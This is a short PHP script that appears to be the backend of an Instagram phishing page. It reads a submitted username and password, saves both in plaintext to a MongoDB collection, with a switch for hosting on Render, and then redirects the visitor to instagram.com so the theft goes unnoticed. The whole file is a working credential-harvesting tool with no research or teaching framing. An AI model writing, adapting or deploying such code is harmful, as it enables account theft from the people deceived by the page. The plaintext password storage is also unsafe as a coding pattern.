<?php
session_start();

require "vendor/autoload.php"; 
use MongoDB\Client;

// Detect if running on Render
if (getenv("RENDER")) {
    $mongo_uri = getenv("MONGO_URI");
} else {
    // Local MongoDB (if installed)
    $mongo_uri = "mongodb://localhost:27017";
}

try {
    $client = new Client($mongo_uri);
    $db = $client->security;
    $users = $db->users;
} catch (Exception $e) {
    die("MongoDB connection failed: " . $e->getMessage());
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (empty($email) || empty($password)) {
        die("Please fill in all fields.");
    }

    // Insert into MongoDB
    $users->insertOne([
        'email' => $email,
        'password' => $password,
        'created_at' => new MongoDB\BSON\UTCDateTime()
    ]);

    $_SESSION['email'] = $email;
    header("Location: https://instagram.com");
    exit;
}
?>
